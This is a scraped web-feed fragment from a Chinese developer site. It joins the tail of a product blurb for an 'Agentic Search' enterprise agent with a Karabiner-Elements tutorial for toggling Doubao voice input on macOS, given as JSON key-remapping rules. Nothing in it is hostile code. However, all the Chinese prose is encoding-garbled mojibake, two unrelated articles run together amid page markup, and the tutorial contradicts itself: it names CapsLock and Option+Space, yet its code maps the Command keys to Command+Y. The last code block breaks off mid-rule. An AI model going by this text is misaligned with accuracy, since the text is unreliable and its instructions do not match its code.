<p>Agentic Search å¯æ— ç¼é›†æˆæ‚¨ç°æœ‰çš„ Elasticsearchï¼ˆESï¼‰æˆ– OpenSearchï¼ˆOSï¼‰å®ä¾‹ï¼Œæ„å»ºä¼ä¸šä¸“å±çŸ¥è¯†åº“ã€‚é€šè¿‡å…ˆè¿›çš„å‘é‡æ£€ç´¢ä¸ RAG æ£€ç´¢å¢å¼ºç”ŸæˆæŠ€æœ¯ï¼ŒAgentic Search èƒ½å¤Ÿåœ¨å›ç­”é—®é¢˜ä¸çŸ¥è¯†è·å–æ—¶ï¼Œä¼˜å…ˆä¸”ç²¾å‡†åœ°å¼•ç”¨ä¸åˆ†ææ‚¨å†…éƒ¨çš„ä¸šåŠ¡æ•°æ®ã€æµç¨‹æ–‡æ¡£ç­‰ï¼Œç¡®ä¿ç­”æ¡ˆç»“æœå®ç°é«˜åº¦è´´åˆä¼ä¸šå®é™…ã€å®‰å…¨å¯ä¿¡ã€‚</p>
<p><strong>CodeAgentä»£ç æ™ºèƒ½ä½“</strong></p>
<p>å®ƒæ‹¥æœ‰ä¸€ä¸ªå®‰å…¨éš”ç¦»çš„ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œèƒ½å¤Ÿè‡ªä¸»ç¼–å†™å¹¶è¿è¡Œä»£ç è„šæœ¬ï¼Œä»¥æ‰§è¡Œå¤æ‚çš„æ•°æ®å¤„ç†ã€æ•°å€¼è®¡ç®—ã€ç»Ÿè®¡åˆ†æå’Œæ ¼å¼è½¬æ¢ç­‰ä»»åŠ¡ã€‚</p>
<p><strong>è”ç½‘æœç´¢</strong></p>
<p>å½“å†…éƒ¨çŸ¥è¯†æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œæˆ–ä»»åŠ¡éœ€è¦æœ€æ–°çš„å…¬å¼€ä¿¡æ¯æ—¶ï¼ŒAgentic Search ä¼šæ™ºèƒ½å¯åŠ¨é›†æˆçš„è”ç½‘æœç´ å·¥å…·ï¼Œå®‰å…¨åœ°è®¿é—®äº’è”ç½‘ã€‚è¿™ä½¿å…¶èƒ½å¤Ÿè·å–å®æ—¶æ–°é—»åŠ¨æ€ã€æœ€æ–°çš„æ”¿ç­–æ³•è§„ã€æƒå¨çš„æŠ€æœ¯æ–‡æ¡£ç­‰ï¼Œä¸ºå†³ç­–æä¾›æœ€æ–°é²œçš„è§†è§’ã€‚</p>
<p><strong>ç½‘ç»œçˆ¬è™«</strong></p>
<p>é’ˆå¯¹éœ€è¦å¹¿æ³›æ”¶é›†ç‰¹å®šé¢†åŸŸç½‘é¡µä¿¡æ¯çš„ä»»åŠ¡ï¼Œå¦‚å¤§è§„æ¨¡å¸‚åœºè°ƒç ”ã€å…¨ç½‘ç«å“ä»·æ ¼ä¸åŠŸèƒ½ç›‘æµ‹ã€èˆ†æƒ…åŠ¨æ€è¿½è¸ªç­‰ï¼ŒAgentic Search å¯éƒ¨ç½²å®šåˆ¶åŒ–çˆ¬è™«ï¼Œè‡ªåŠ¨åŒ–ã€ç»“æ„åŒ–åœ°æ‰¹é‡æŠ“å–ç›®æ ‡ç½‘ç«™æ•°æ®ã€‚</p>
<p><strong>æµè§ˆå™¨ä»£ç†</strong></p>
<p>å†…ç½®çš„æµè§ˆå™¨ä»£ç†èƒ½å¤Ÿæ¨¡æ‹ŸçœŸå®ç”¨æˆ·çš„ç‚¹å‡»ã€æ»šåŠ¨ã€ç™»å½•ç­‰æ“ä½œã€‚è¿™ä½¿å¾— Agentic Search å¯ä»¥äº²è‡ªâ€è®¿é—®å’Œæ“ä½œéœ€è¦äº¤äº’æ‰èƒ½è·å–ä¿¡æ¯çš„ç½‘ç«™ï¼Œä¾‹å¦‚åœ¨ç”µå•†å¹³å°è¿›è¡Œå¤šç»´åº¦å•†å“æ¯”ä»·ç­‰ã€‚</p>
<h3 data-id="heading-8">å¤šå…ƒåŒ–è¾“å‡º</h3>
<p>ä¸ºæ»¡è¶³ä¸åŒåœºæ™¯ä¸‹çš„æ±‡æŠ¥ä¸ä½¿ç”¨éœ€æ±‚ï¼ŒAgentic Search å†…ç½®äº†å¼ºå¤§çš„æŠ¥å‘Šç”Ÿæˆå·¥å…·ï¼Œæ”¯æŒå¤šç§è¾“å‡ºæ ¼å¼</p>
<p><strong>Markdown æ ¼å¼:</strong> è¯¦å°½å…¨é¢ï¼Œä¿ç•™æ‰€æœ‰åˆ†æè¿‡ç¨‹ã€æ•°æ®æ¥æºå’Œæ¨ç†æ­¥éª¤ï¼Œé€‚åˆéœ€è¦æ·±åº¦æº¯æºå’Œå­˜æ¡£çš„ä¸¥è°¨åˆ†æåœºæ™¯ã€‚</p>
<p><strong>HTML æ ¼å¼:</strong> è§†è§‰ä¸°å¯Œï¼Œé€šè¿‡å›¾è¡¨ã€è¡¨æ ¼å’Œé«˜äº®æ–‡æœ¬ï¼Œå°†å¤æ‚çš„åˆ†æç»“æœä»¥æ¸…æ™°ã€ç›´è§‚ã€æ˜“äºç†è§£çš„å½¢å¼å‘ˆç°ï¼Œé€‚ç”¨äºç®¡ç†å±‚æ±‡æŠ¥ã€è·¨éƒ¨é—¨æ²Ÿé€šç­‰åœºæ™¯ã€‚</p>
<h2 data-id="heading-9">åº”ç”¨åœºæ™¯</h2>
<p><strong>æ·±åº¦ç ”ç©¶</strong></p>
<p>é¢å¯¹è¡Œä¸šç ”ç©¶ã€å¸‚åœºè°ƒç ”ã€ç«å“åˆ†æç­‰å¤æ‚è¯¾é¢˜ï¼ŒAgentic Search ç›¸å½“äºä¸€æ”¯æ™ºèƒ½ç ”ç©¶å›¢é˜Ÿã€‚ç”¨æˆ·åªéœ€æå‡ºæ€»ä½“éœ€æ±‚ï¼Œæ™ºèƒ½ä»£ç†å°±ä¼šè‡ªåŠ¨æ‹†è§£ç ”ç©¶ä»»åŠ¡â€”â€”ä¾‹å¦‚æ”¶é›†å¸‚åœºè¶‹åŠ¿ã€æ•´ç†ç«å“èµ„æ–™ã€åˆ†ææ•°æ®å¹¶æ’°å†™æŠ¥å‘Šç­‰ï¼Œå¹¶ç»¼åˆå¤šæ¥æºä¿¡æ¯ç»™å‡ºå…¨é¢ç»“æœã€‚æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹å€ŸåŠ©å¤šæ­¥æ¨ç†ä¸ä¸“ä¸šå·¥å…·è‡ªåŠ¨å®Œæˆï¼Œå¤§å¹…æé«˜ç ”ç©¶å·¥ä½œçš„æ•ˆç‡å’Œæ·±åº¦ã€‚</p>
<p><strong>æ™ºèƒ½å®¢æœä¸é—®ç­”åŠ©æ‰‹</strong></p>
<p>é¢å‘å®¢æˆ·æ”¯æŒä¸æœåŠ¡åœºæ™¯ï¼ŒAgentic Search æ”¯æŒæ¥å…¥ä¼ä¸š ES/OS å®ä¾‹çŸ¥è¯†åº“ã€FAQ æ–‡æ¡£ç­‰å†…éƒ¨æ•°æ®æºï¼Œå¯ç”¨äºå…¨å¤©å€™æ™ºèƒ½å®¢æœä»£ç†å’Œé—®ç­”åŠ©æ‰‹ã€‚è¿™ç§ç»Ÿä¸€æ™ºèƒ½ä»£ç†çš„å½¢å¼èƒ½æ”¯æŒ24*7åˆ¶ç”¨æˆ·å“åº”ï¼Œå¤§å¹…æå‡ç»ˆç«¯ç”¨æˆ·ä½“éªŒä»¥åŠå¤§å¹…é™ä½ä¼ä¸šäººåŠ›æˆæœ¬ï¼Œå®ç°äº†é—®é¢˜çš„ä¸€ç«™å¼è§£å†³ã€‚</p>
<p><strong>ä¼ä¸šç”Ÿäº§åŠ›ææ•ˆ</strong></p>
<p>Agentic Search å¯ä»¥ä½œä¸ºä¼ä¸šå‘˜å·¥çš„æ•ˆç‡åŠ©ç†ï¼Œæ‰¿æ‹…è®¸å¤šè€—æ—¶è€—åŠ›çš„ä¿¡æ¯æ•´åˆå’ŒæŠ¥å‘Šç”Ÿæˆä»»åŠ¡ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯ä»¥æ ¹æ®æŒ‡å®šæ¡ä»¶æ±‡æ€»æ•°æ®ï¼Œç”Ÿæˆå‘¨æŠ¥/æœˆæŠ¥ç­‰ï¼Œæˆ–è€…ä»ä¼ä¸šæ–‡ä»¶å’Œä¸šåŠ¡æ•°æ®åº“ä¸­æŠ“å–å…³é”®ä¿¡æ¯ï¼Œç›´æ¥è¾“å‡ºåˆ†æç»“æœã€‚é€šè¿‡å°†æµ·é‡åˆ†æ•£çš„æ•°æ®è½¬åŒ–ä¸ºå¯è¡ŒåŠ¨çš„æ´è§ï¼ŒAgentic Search èµ‹èƒ½ä¼ä¸šå‘˜å·¥æå‡ç”Ÿäº§æ•ˆç‡ï¼Œä¸ºä¼ä¸šå®ç°æ›´é«˜æ•ˆçš„ç»„ç»‡ç®¡ç†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Karabiner-Elements è±†åŒ…è¯­éŸ³è¾“å…¥ä¸€é”®å¯åœæ“ä½œæ‰‹å†Œ]]></title>    <link>https://juejin.cn/post/7595311405750845486</link>    <guid>https://juejin.cn/post/7595311405750845486</guid>    <pubDate>2026-01-15T06:09:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595311405750845486" data-draft-id="7595157651619823642" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Karabiner-Elements è±†åŒ…è¯­éŸ³è¾“å…¥ä¸€é”®å¯åœæ“ä½œæ‰‹å†Œ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-15T06:09:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å­¦ä¹ éæš´åŠ›æ²Ÿé€šçš„ç¨‹åºå‘˜"/> <meta itemprop="url" content="https://juejin.cn/user/4183005583377070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Karabiner-Elements è±†åŒ…è¯­éŸ³è¾“å…¥ä¸€é”®å¯åœæ“ä½œæ‰‹å†Œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4183005583377070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å­¦ä¹ éæš´åŠ›æ²Ÿé€šçš„ç¨‹åºå‘˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T06:09:11.000Z" title="Thu Jan 15 2026 06:09:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Karabiner-Elements è±†åŒ…è¯­éŸ³è¾“å…¥ä¸€é”®å¯åœæ“ä½œæ‰‹å†Œ</h2>
<h3 data-id="heading-1">ä¸€ã€æ‰‹å†Œè¯´æ˜</h3>
<p>é€‚ç”¨åœºæ™¯ï¼šè§£å†³è±†åŒ…å®¢æˆ·ç«¯è¯­éŸ³è¾“å…¥éœ€æŒ‰ä¸¤ç»„å¿«æ·é”®çš„ç¹çé—®é¢˜ï¼Œé€šè¿‡å·¥å…·å®ç°ä¸€é”®å‘¼å‡ºã€ä¸€é”®å…³é—­ã€‚</p>
<p>é€‚ç”¨ç³»ç»Ÿï¼šmacOS å…¨ç‰ˆæœ¬ï¼ˆVentura/Sonoma/Sequoia å…¼å®¹ï¼‰</p>
<p>æ ¸å¿ƒæ•ˆæœï¼šå•é”®è§¦å‘è±†åŒ…åŸç”Ÿè¯­éŸ³å¿«æ·é”®ï¼ˆOption+Spaceï¼‰ï¼Œä¸€é”®å¯åœï¼Œå…¨å±€ç”Ÿæ•ˆæ— å†²çªã€‚</p>
<h3 data-id="heading-2">äºŒã€ä¸ºä½•é€‰æ‹© Karabiner-Elements</h3>
<ol>
<li>ç³»ç»Ÿçº§å“åº”ï¼šå†…æ ¸å±‚è¿è¡Œï¼Œ0å»¶è¿Ÿè§¦å‘ï¼Œä¼˜äºè„šæœ¬ç±»å·¥å…·ï¼›</li>
<li>ç²¾å‡†åŒ¹é…éœ€æ±‚ï¼šåŸç”Ÿæ”¯æŒâ€œå•é”®æ˜ å°„ç»„åˆé”®â€ï¼Œå®Œç¾å®ç°æ ¸å¿ƒè¯‰æ±‚ï¼›</li>
<li>è½»é‡ç¨³å®šï¼šå…è´¹å¼€æºï¼Œå ç”¨å†…å­˜å°‘ï¼Œé…ç½®æŒä¹…åŒ–ï¼Œé‡å¯ä¸ä¸¢å¤±ï¼›</li>
<li>æ— ä¾µå…¥å…¼å®¹ï¼šä»…æ¨¡æ‹ŸæŒ‰é”®æ“ä½œï¼Œä¸ä¿®æ”¹è±†åŒ…ï¼Œç‰ˆæœ¬æ›´æ–°ä¸å—å½±å“ã€‚</li>
</ol>
<h3 data-id="heading-3">ä¸‰ã€å‰ç½®å‡†å¤‡</h3>
<ol>
<li>ç¡®è®¤è±†åŒ…è¯­éŸ³å¿«æ·é”®ï¼šé»˜è®¤<strong>Option+Space</strong>ï¼ˆä¸€é”®å¯åœï¼ŒæŒ‰ä¸¤æ¬¡åˆ†åˆ«æ§åˆ¶å‘¼å‡º/å…³é—­ï¼‰ï¼›</li>
<li>å®‰è£…å·¥å…·ï¼šä»å®˜ç½‘ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fkarabiner-elements.pqrs.org%2F%25EF%25BC%2589%25E4%25B8%258B%25E8%25BD%25BD" target="_blank" title="https://karabiner-elements.pqrs.org/%EF%BC%89%E4%B8%8B%E8%BD%BD" ref="nofollow noopener noreferrer">karabiner-elements.pqrs.org/ï¼‰ä¸‹è½½</a> Karabiner-Elementsï¼ŒæŒ‰æç¤ºå®Œæˆç³»ç»Ÿæˆæƒã€‚</li>
</ol>
<h3 data-id="heading-4">å››ã€åˆ†æ­¥æ“ä½œæµç¨‹ï¼ˆå…¨ç¨‹5åˆ†é’Ÿï¼‰</h3>
<h4 data-id="heading-5">æ­¥éª¤1ï¼šè¿›å…¥å¤åˆä¿®æ”¹é…ç½®é¡µ</h4>
<p>å¯åŠ¨ Karabiner-Elementsï¼Œç‚¹å‡»é¡¶éƒ¨èœå•æ â€œå°åœ°çƒâ€â†’ã€ŒPreferencesã€â†’ å·¦ä¾§é€‰æ‹©ã€ŒComplex modificationsã€â†’ ç‚¹å‡»å³ä¾§ã€ŒAdd ruleã€ã€‚</p>
<h4 data-id="heading-6">æ­¥éª¤2ï¼šåˆ›å»ºè‡ªå®šä¹‰è§„åˆ™</h4>
<p>ç‚¹å‡»ä¸‹æ–¹ã€ŒCreate a new ruleã€ï¼Œå†ç‚¹å‡»å³ä¾§ã€ŒOpen in editorã€ï¼Œè¿›å…¥ä»£ç ç¼–è¾‘ç•Œé¢ï¼ˆæ¸…ç©ºåŸæœ‰å†…å®¹ï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/503342a6fa684d7cbad9c0f097011f8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2m5Lmg6Z2e5pq05Yqb5rKf6YCa55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062150&amp;x-signature=aBUwZNbN97kGLSdOievjr2QRPLk%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">æ­¥éª¤3ï¼šé…ç½®æ˜ å°„ä»£ç ï¼ˆå¤åˆ¶å³ç”¨ï¼‰</h4>
<p>ç²˜è´´ä»¥ä¸‹ä»£ç ï¼Œé»˜è®¤å°†ã€ŒCapsLockã€è®¾ä¸ºè§¦å‘é”®ï¼ˆæ— å†²çªï¼Œæ¨èä½¿ç”¨ï¼‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/411ae2d8cc5d4c0ebc74b9fb09a78912~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2m5Lmg6Z2e5pq05Yqb5rKf6YCa55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062150&amp;x-signature=q%2BdeOsSphxRqGQ9xDz%2FKgBRv1fw%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-css" lang="css">{
    "description": <span class="hljs-string">"ã€è±†åŒ…è¯­éŸ³ã€‘å·¦Command - å¯åŠ¨"</span>,
    <span class="hljs-string">"manipulators"</span>: [
        {
            "conditions": [
                {
                    "name": <span class="hljs-string">"voice_input_on"</span>,
                    <span class="hljs-string">"type"</span>: <span class="hljs-string">"variable_if"</span>,
                    <span class="hljs-string">"value"</span>: <span class="hljs-number">0</span>
                }
            ],
            "<span class="hljs-selector-tag">from</span>": { "key_code": <span class="hljs-string">"left_command"</span> },
            "<span class="hljs-selector-tag">to</span>": [{ "key_code": <span class="hljs-string">"left_command"</span> }],
            "to_if_alone": [
                {
                    "key_code": <span class="hljs-string">"y"</span>,
                    <span class="hljs-string">"modifiers"</span>: [<span class="hljs-string">"command"</span>]
                },
                {
                    "set_variable": {
                        "name": <span class="hljs-string">"voice_input_on"</span>,
                        <span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>
                    }
                }
            ],
            "type": <span class="hljs-string">"basic"</span>
        }
    ]
}
</code></pre>
<h4 data-id="heading-8">æ­¥éª¤4ï¼šå¯ç”¨è§„åˆ™å¹¶æµ‹è¯•</h4>
<ol>
<li>ç²˜è´´åè‡ªåŠ¨ä¿å­˜ï¼Œè¿”å›ã€ŒComplex modificationsã€é¡µé¢ï¼Œå¼€å¯æ–°å»ºè§„åˆ™çš„å¼€å…³ï¼ˆå®æ—¶ç”Ÿæ•ˆï¼‰ï¼›</li>
<li>æµ‹è¯•éªŒè¯ï¼šæ‰“å¼€è±†åŒ…ï¼ŒæŒ‰ä¸€æ¬¡ CapsLock å‘¼å‡ºè¯­éŸ³ï¼Œå†æŒ‰ä¸€æ¬¡å…³é—­ï¼ŒåŠŸèƒ½æ­£å¸¸å³é…ç½®å®Œæˆã€‚</li>
</ol>
<h3 data-id="heading-9">äº”ã€å¯é€‰è°ƒæ•´ï¼ˆæŒ‰éœ€ä¿®æ”¹ï¼‰</h3>
<p>æ›´æ¢è§¦å‘é”®ï¼šä»…ä¿®æ”¹ä»£ç ä¸­ã€Œkey_codeã€å€¼å³å¯ï¼Œç¤ºä¾‹ï¼š</p>
<ul>
<li>å³Commandé”®ï¼šæ”¹ä¸ºã€Œright_commandã€ï¼›</li>
<li>F12é”®ï¼šæ”¹ä¸ºã€Œf12ã€ã€‚</li>
</ul>
<p>ï¼ˆæŒ‰é”®åç§°å¯é€šè¿‡ Karabinerã€ŒEventViewerã€æŸ¥çœ‹ï¼ŒæŒ‰ä¸‹æŒ‰é”®å³å¯æ˜¾ç¤ºå¯¹åº”åç§°ï¼‰</p>
<h3 data-id="heading-10">å…­ã€å¸¸è§é—®é¢˜æ’æŸ¥</h3>
<ol>
<li>è§¦å‘æ— ååº”ï¼šæ£€æŸ¥è§„åˆ™å¼€å…³æ˜¯å¦å¼€å¯ï¼Œè±†åŒ…æ˜¯å¦æ¿€æ´»ï¼Œé‡å¯ Karabiner é‡è¯•ï¼›</li>
<li>å¿«æ·é”®å†²çªï¼šæ›´æ¢è§¦å‘é”®ï¼ˆå¦‚å³Optionã€F13ï¼‰ï¼Œé¿å¼€å¸¸ç”¨æŒ‰é”®ï¼›</li>
<li>é‡å¯åå¤±æ•ˆï¼šé…ç½®è‡ªåŠ¨æŒä¹…åŒ–ï¼Œè‹¥å¤±æ•ˆé‡æ–°å¼€å¯è§„åˆ™å³å¯ã€‚</li>
</ol>
<h3 data-id="heading-11">ä¸ƒã€é€šè¿‡MISC å®ç°é…ç½®</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac78db33f4e44a0ba2d6ba12d439534a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2m5Lmg6Z2e5pq05Yqb5rKf6YCa55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062150&amp;x-signature=kfgDuWnmwPTY0iUAnHv9d6JspLw%3D" alt="image.png" loading="lazy"/>
ç‚¹å‡» Misc,ä¹‹åç‚¹å‡» Open Config folderï¼Œç¼–è¾‘karabiner.jsonï¼Œå°†ä¸€ä¸‹ä»£ç ç›´æ¥è´´å…¥å…¶ä¸­å°±å¥½ã€‚
å¦‚æœæ²¡æœ‰karabiner.jsonæ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥è‡ªå·±åˆ›å»ºã€‚ï¼ˆå¿«é€Ÿå®ç° Mac å…¨å±€åˆ›å»º json æ–‡ä»¶æ–¹æ³•ï¼š<a href="https://juejin.cn/post/7595289498445201434" target="_blank" title="https://juejin.cn/post/7595289498445201434">juejin.cn/post/759528â€¦</a></p>
<pre><code class="hljs language-css" lang="css">{
    "profiles": [
        {
            "complex_modifications": {
                "rules": [
                    {
                        "description": <span class="hljs-string">"ã€è±†åŒ…è¯­éŸ³ã€‘å·¦Command - å¯åŠ¨"</span>,
                        <span class="hljs-string">"manipulators"</span>: [
                            {
                                "conditions": [
                                    {
                                        "name": <span class="hljs-string">"voice_input_on"</span>,
                                        <span class="hljs-string">"type"</span>: <span class="hljs-string">"variable_if"</span>,
                                        <span class="hljs-string">"value"</span>: <span class="hljs-number">0</span>
                                    }
                                ],
                                "<span class="hljs-selector-tag">from</span>": { "key_code": <span class="hljs-string">"left_command"</span> },
                                "<span class="hljs-selector-tag">to</span>": [{ "key_code": <span class="hljs-string">"left_command"</span> }],
                                "to_if_alone": [
                                    {
                                        "key_code": <span class="hljs-string">"y"</span>,
                                        <span class="hljs-string">"modifiers"</span>: [<span class="hljs-string">"command"</span>]
                                    },
                                    {
                                        "set_variable": {
                                            "name": <span class="hljs-string">"voice_input_on"</span>,
                                            <span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>
                                        }
                                    }
                                ],
                                "type": <span class="hljs-string">"basic"</span>
                            }
                        ]
                    },
                    {
                        "description": <span class="hljs-string">"ã€è±†åŒ…è¯­éŸ³ã€‘å·¦Command - å–æ¶ˆ"</span>,
                        <span class="hljs-string">"manipulators"</span>: [
                            {
                                "conditions": [
                                    {
                                        "name": <span class="hljs-string">"voice_input_on"</span>,
                                        <span class="hljs-string">"type"</span>: <span class="hljs-string">"variable_if"</span>,
                                        <span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>
                                    }
                                ],
                                "<span class="hljs-selector-tag">from</span>": { "key_code": <span class="hljs-string">"left_command"</span> },
                                "<span class="hljs-selector-tag">to</span>": [{ "key_code": <span class="hljs-string">"left_command"</span> }],
                                "to_if_alone": [
                                    { "key_code": <span class="hljs-string">"escape"</span> },
                                    {
                                        "set_variable": {
                                            "name": <span class="hljs-string">"voice_input_on"</span>,
                                            <span class="hljs-string">"value"</span>: <span class="hljs-number">0</span>
                                        }
                                    }
                                ],
                                "type": <span class="hljs-string">"basic"</span>
                            }
                        ]
                    },
                    {
                        "description": <span class="hljs-string">"ã€è±†åŒ…è¯­éŸ³ã€‘å³Command - å¯åŠ¨"</span>,
                        <span class="hljs-string">"manipulators"</span>: [
                            {
                                "conditions": [
                                    {
                                        "name": <span class="hljs-string">"voice_input_on"</span>,
                                        <span class="hljs-string">"type"</span>: <span class="hljs-string">"variable_if"</span>,
                                        <span class="hljs-string">"value"</span>: <span class="hljs-number">0</span>
                                    }
                                ],
                                "<span class="hljs-selector-tag">from</span>": { "key_code": <span class="hljs-string">"right_command"</span> },
                                "<span class="hljs-selector-tag">to</span>": [{ "key_code": <span class="hljs-string">"right_command"</span> }],
                                "to_if_alone": [
                                    {
